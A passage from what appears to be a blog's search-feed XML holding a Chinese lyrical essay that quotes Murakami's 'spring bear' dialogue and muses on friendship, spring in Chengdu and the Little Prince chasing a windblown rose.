</blockquote>
<p>所以我想到多年前认识的一个机灵的朋友。</p>
<p>他是一只熊。</p>
<p>一只春天里的熊。</p>
<pre><code>“最最喜欢你，绿子。”
“什么程度？”
“像喜欢春天的熊一样。”
“春天的熊？什么春天的熊？”
“春天的原野里，你，一个人正走着，对面走来一只可爱的小熊，浑身的毛活像天鹅绒，眼睛圆鼓鼓的。
它这么对你说道:
‘你好，小姐，和我一块儿打滚玩好么？’
接着，你就和小熊抱在一起，顺着长满三叶草的山坡咕噜噜滚下来，整整玩了一大天，你说棒不棒？”
“太棒了！”
“我就是这么喜欢你！”
</code></pre><p>春天的熊哥注定是个极讨女孩子欢心的熊。</p>
<p>我却不是。</p>
<p>因为我既没有他那绒厚的脂肪来缓冲从山顶滚到山脚的摩擦，也没有他那清澈的晶状体房水来倒映出整个湛蓝的天。</p>
<p>然而，我还是很高兴能结识他们两个碧池碧莲。</p>
<p>他们鲜衣怒马，少年才俊。</p>
<p>他们就是牛逼，</p>
<p>新鲜的牛逼。</p>
<p>有空时，</p>
<p>我们聊聊教育面向现代化面向世界面向未来，</p>
<p>再吹逼一下世界霍乱时我们如何去拯救别人的爱情。</p>
<p>最后总结一下把整个春天都拥入怀里的250种方法。</p>
<p>看来所有不要脸的人都注定要相遇的。</p>
<p>成都的春天真绿啊。</p>
<p>阳光透过叶的缝隙小孔成像。</p>
<p>不规则地映射了一个季节。</p>
<p>不知道厦门的太阳是否温软？</p>
<p>不知道可否有一天，我能够像小王子和春天的熊一样，</p>
<p>以真正牛逼的姿态再次相见。</p>
<p>大言不惭地说自己已经足够帅气足够有钱任性，</p>
<p>能依然对汲汲营营的名誉、条条框框的规则、战战兢兢的人情 不屑一顾，</p>
<p>对嘲讽和贬低的声音置之不理，保有与物质世界隔开距离的独到审美，</p>
<p>把所有的目光都留给美好、聪明、温柔的所在。</p>
<p>毕竟，</p>
<p>这才是我们和这个世界结交的缘由。</p>
<p>小王子走近这朵不期而至的玫瑰花。</p>
<p>风却把这朵玫瑰吹散。</p>
<p>花瓣迎着风，</p>
<p>在最高点乘着叶片向前飞。</p>
<p>小王子也迎着风向前追。</p>
<p>然而，扬起的风反而使玫瑰渐行渐远。</p>
<p><strong>如果我不能像一阵风，</strong></p>
<p><strong>那么，</strong></p>
<p><strong>请让我追逐你风中飘忽不定的脸。</strong></p>
]]></content>
    </entry>
    
  
  
</search>
